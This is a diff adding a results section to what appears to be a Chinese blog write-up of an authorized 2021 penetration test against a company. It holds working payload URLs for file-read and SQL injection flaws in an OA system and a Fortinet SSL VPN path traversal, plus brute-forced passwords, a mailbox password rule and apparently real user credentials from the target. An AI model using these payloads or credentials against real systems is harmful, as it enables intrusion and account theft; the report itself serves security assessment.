@@ -16,7 +16,7 @@ description: 渗透实战
 
 ​	经过xxx演习指挥部授权，于2021年11月30日，对xxxxx股份有限公司进行了渗透评估，通过模拟真实网络攻击行为，评估系统是否存在可以被攻击者利用的漏洞以及由此因此引发的风险大小，为制定相应的安全措施与解决方案提供实际的依据。
 
-渗透结果总结汇总如下表（已脱敏处理）：
+渗透结果总结汇总如下表（敏感信息已脱敏处理）：
 
 | **渗透系统对象**                   | **漏洞类型及**          | **URL****或****IP**                | **数量** |
 | ---------------------------------- | ----------------------- | ---------------------------------- | -------- |
@@ -52,5 +52,129 @@ description: 渗透实战
 
 ​	通过搜索引擎确定域名资产 -> 端口扫描探测服务 ->爆破获得OA系统账号 -> 发现SQL注入、文件读取漏洞 -> 获取企业邮箱密码规则 -> 获取企业邮箱多个账户权限 -> 测试其他端口服务 -> 发现SQL注入
 
+**2.2.3 成果截图**
 
+**2.2.3.1 OA系统相关漏洞：**
+
+​	1）搜集某单位相关信息
+
+![1](https://havocykp.github.io/assets/images/img_blog14/1.png)
+
+​	2）端口扫描
+
+![2](https://havocykp.github.io/assets/images/img_blog14/2.png)
+
+​	3）确定OA端口为8001
+
+![3](https://havocykp.github.io/assets/images/img_blog14/3.png)
+
+​	4）爆破得到弱口令：test|123456789q，登录到系统
+
+![4](https://havocykp.github.io/assets/images/img_blog14/4.png)
+
+​	5）使用文件读取漏洞读取数据库配置文件
+
+![5](https://havocykp.github.io/assets/images/img_blog14/5.png)
+
+/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php
+
+/module/AIP/get_file.php?MODULE=/&ATTACHMENT_ID=.._webroot/inc/oa_config&ATTACHMENT_NAME=php
+
+​	6）存在SQL注入
+
+![6](https://havocykp.github.io/assets/images/img_blog14/6.png)
+
+使用Payload：
+
+/inc/finger/use_finger.php?USER_ID=-123* 宽字节注入
+
+![7](https://havocykp.github.io/assets/images/img_blog14/7.png)
+
+​	7）获取User表全部内容
+
+![8](https://havocykp.github.io/assets/images/img_blog14/8.png)
+
+​	8）上述商户密码可解密，但需修改密码才可登录，未作修改
+
+**2.2.3.2 邮件系统相关漏洞：**
+
+​	1）本地搭建极限OA，通过文件结构确定数据库所在位置
+
+![9](https://havocykp.github.io/assets/images/img_blog14/9.png)
+
+​	2）利用OA的任意文件读取漏洞，下载数据库文件并覆盖到本地，通过查询数据关键字“密码”获得邮箱系统密码规则为：用户名+1347
+
+![10](https://havocykp.github.io/assets/images/img_blog14/10.png)
+
+![11](https://havocykp.github.io/assets/images/img_blog14/11.png)
+
+​	3）尝试登录邮箱系统
+
+admin|admin1347
+
+![12](https://havocykp.github.io/assets/images/img_blog14/12.png)
+
+登录财务部邮箱，显示大量银行账单
+
+![13](https://havocykp.github.io/assets/images/img_blog14/13.png)
+
+多个邮箱
+
+![14](https://havocykp.github.io/assets/images/img_blog14/14.png)
+
+​	其它账户不做过多登录，密码规则为：账户名 + 1347
+
+**2.2.3.3 报表系统相关漏洞：**
+
+<http://1.x.x.198:8090/WebReport>
+
+![15](https://havocykp.github.io/assets/images/img_blog14/15.png)
+
+![16](https://havocykp.github.io/assets/images/img_blog14/16.png)
+
+弱口令：admin|admin，超级管理员
+
+![17](https://havocykp.github.io/assets/images/img_blog14/17.png)
+
+![18](https://havocykp.github.io/assets/images/img_blog14/18.png)
+
+​	**2.2.3.4 多个相关接口，未授权访问+SQL注入：**
+
+​	相关地址：
+
+​	<http://1.x.x.198:86/>
+
+​	<http://1.x.x.198:81/>
+
+​	<http://1.x.x.198:8032>
+
+存在WSDL接口未授权访问，导入burp中构造数据包，发现SQL注入，数据库为oracle
+
+<http://1.x.x.198:8032/ErpService.svc?wsdl>
+
+![19](https://havocykp.github.io/assets/images/img_blog14/19.png)
+
+![20](https://havocykp.github.io/assets/images/img_blog14/20.png)
+
+使用SQLmap进行进一步注入，获取到多个数据库账号密码，并可获取数据库全部数据
+
+![21](https://havocykp.github.io/assets/images/img_blog14/21.png)
+
+其它两个相关接口均为WSDL
+
+​	**2.2.3.5 飞塔VPN Session文件读取：**
+
+​	10443端口为飞塔VNP，<https://1.x.x.198:10443/remote/>
+
+![22](https://havocykp.github.io/assets/images/img_blog14/22.png)
+
+使用文件读取漏洞读取到session文件，获取用户名密码为：wanglijia/DNBgtspslz
+
+<https://1.x.x.198:10443/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession>
+
+![23](https://havocykp.github.io/assets/images/img_blog14/23.png)
+
+登录系统
+
+![24](https://havocykp.github.io/assets/images/img_blog14/24.png)
 
